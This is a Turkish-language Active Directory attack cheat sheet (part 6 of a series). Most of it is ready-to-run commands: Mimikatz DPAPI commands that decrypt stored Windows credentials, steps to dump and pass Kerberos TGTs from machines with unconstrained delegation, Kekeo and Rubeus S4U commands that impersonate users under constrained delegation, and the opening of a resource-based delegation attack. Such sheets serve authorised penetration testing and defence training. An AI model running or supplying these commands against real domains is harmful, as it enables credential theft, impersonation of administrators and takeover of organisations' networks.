# Active Directory Exploitation Cheat Sheet - Bölüm 6

## DPAPI ile Şifreli Kimlik Bilgilerini Çözme

### Mimikatz Kullanımı:
- **Kimlik Bilgisi Nesnesini Çözümleme:**
  ```mimikatz
  dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
  ```

- **`guidMasterKey` Parametresini İnceleme:**
  Bu parametre hangi masterkey'in kimlik bilgisini şifrelemek için kullanıldığını belirtir.

- **Master Key'i Listeleme:**
  ```mimikatz
  dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"
  ```

- **Master Key'i RPC ile Domain Controller'a Geçirme:**
  ```mimikatz
  dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc
  ```

- **Master Key'in Lokal Cache'e Alınması:**
  ```mimikatz
  dpapi::cache
  ```

- **Kimlik Bilgisini Çözme:**
  ```mimikatz
  dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
  ```

### Detaylı Makale:
- DPAPI All The Things

## Unconstrained Delegation

### Açıklama:
Eğer bir makinede Unconstrained Delegation etkin ve bu makineye yönetici erişiminiz varsa, yüksek değerli hedeflerin (ör. Domain Admin) bu makineye bağlanmasını bekleyebilir, TGT'lerini çalıp impersonate edebilirsiniz.

#### PowerView Kullanımı:
- **Unconstrained Delegation Etkin Olan Bilgisayarları Keşfet:**
  ```powershell
  Get-NetComputer -UnConstrained
  ```

- **TGT'leri Listeleme:**
  ```mimikatz
  Invoke-Mimikatz -Command '"sekurlsa::tickets"'
  ```

- **Gelen Oturumları İzleme:**
  ```powershell
  Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay <WaitInterval> -Verbose
  ```

- **TGT'leri Disk'e Dump Etme:**
  ```mimikatz
  Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
  ```

- **Kullanıcıyı PTT ile İmpersonate Etme:**
  ```mimikatz
  Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
  ```

### Alternatif Araç:
- Rubeus

## Constrained Delegation

### PowerView ve Kekeo Kullanımı:
- **Constrained Delegation Etkin Kullanıcı ve Bilgisayarları Listele:**
  ```powershell
  Get-DomainUser -TrustedToAuth
  Get-DomainComputer -TrustedToAuth
  ```

- **Kullanıcı İçin TGT Talep Etme:**
  ```bash
  tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>
  ```

- **TGS Talep Etme:**
  ```bash
  tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>
  ```

- **Mimikatz ile TGS PTT Yapma:**
  ```mimikatz
  Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
  ```

### Rubeus Kullanımı:
- **S4U Saldırısı Gerçekleştirme:**
  ```bash
  Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
  ```

### Alternatif Servis İstismarı:
- Eğer belirli bir SPN için delegasyon haklarınız varsa, Kerberos'un "alternative service" özelliğini kullanarak başka hizmetler için de geçerli TGS biletleri talep edebilirsiniz.

## Resource-Based Constrained Delegation

### Açıklama:
Eğer bir domain makine hesabı üzerinde GenericALL/GenericWrite yetkileriniz varsa, bu makine hesabını suistimal ederek herhangi bir domain kullanıcısı (ör. Domain Admin) olarak kendinizi taklit edebilirsiniz.

#### Kullanılacak Araçlar:
- **PowerView**
- **Powermad**
- **Rubeus**

### İlk Adım:
Yetkilere sahip kullanıcı/makine hesabının güvenlik bağlamına girin. Kullanıcı hesabı için Pass the Hash, RDP veya PSCredentials kullanılabilir.
